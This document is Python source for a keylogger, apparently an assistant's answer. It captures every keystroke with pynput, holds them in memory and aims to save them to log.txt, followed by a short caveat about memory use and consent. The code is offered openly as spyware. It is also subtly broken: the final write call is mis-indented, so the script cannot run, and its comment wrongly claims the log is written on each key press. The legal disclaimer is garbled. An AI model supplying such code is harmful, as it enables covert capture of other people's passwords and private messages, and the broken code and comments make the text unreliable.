```python
import pynput
from pynput import keyboard, mouse

class Keylogger():
    def __init__(self):
        self.log = ""

    # Function to log keystrokes on key press
    def on_press(self,key):
        try: self.log += str(key.char) + "\n" 
        except AttributeError: 
            if key == keyboard.Key.space: 
                self.log += "SPACE\n"
            elif key == keyboard.Key.enter:
               self.log += "ENTER\n"
            else:
                self.log += str(key) + "\n"    #Logs special keys
    
    # Function for writing captured logs to file 'log.txt'
    def write_file(self):
        with open("log.txt","w") as f:
             f.write(self.log)  
             
myKeylogger = Keylogger() 
with keyboard.Listener(on_press=myKeylogger.on_press) as listener:    #listen to key presses
     listener.join()    #To make the program run forever, until stopped.
         myKeylogger.write_file()   #Write logs to file 'log.txt' whenever a key is pressed.
```
Note that this code will continuously capture keystrokes and store them into memory which might consume a considerable amount of RAM usage. Thus always consider its use-case and context while running it. 

Please remember, capturing keystrokes without user consent from the target machine can be illegal if not properly legal in every country and jurisdictions under question. Always ask permission before collecting such data.
